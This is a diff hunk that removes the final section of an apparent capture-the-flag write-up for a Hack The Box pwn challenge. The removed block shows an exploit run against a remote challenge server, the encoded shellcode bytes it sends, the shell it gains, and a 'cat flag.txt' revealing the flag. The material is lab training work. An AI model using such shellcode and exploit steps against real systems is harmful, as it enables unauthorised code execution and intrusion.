@@ -434,15 +434,3 @@ p.interactive()
 
 ```
 
-```bash
-➜  pwn_execute ./exploit.py REMOTE
-[+] Opening connection to 94.237.63.109 on port 34542: Done
-Check shellcode: b'H\\xbf\\xd0\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xffH\\x83\\xf7\\xffWH\\x89\\xe7PH\\x89\\xc6H\\x89\\xc2j:X\\x04\\x01\\x0f\\x05'
-[*] Switching to interactive mode
-Hey, just because I am hungry doesn't mean I'll execute everything
-$ ls
-execute
-flag.txt
-$ cat flag.txt
-HTB{wr1t1ng_sh3llc0d3_1s_s0_c00l}$
-```
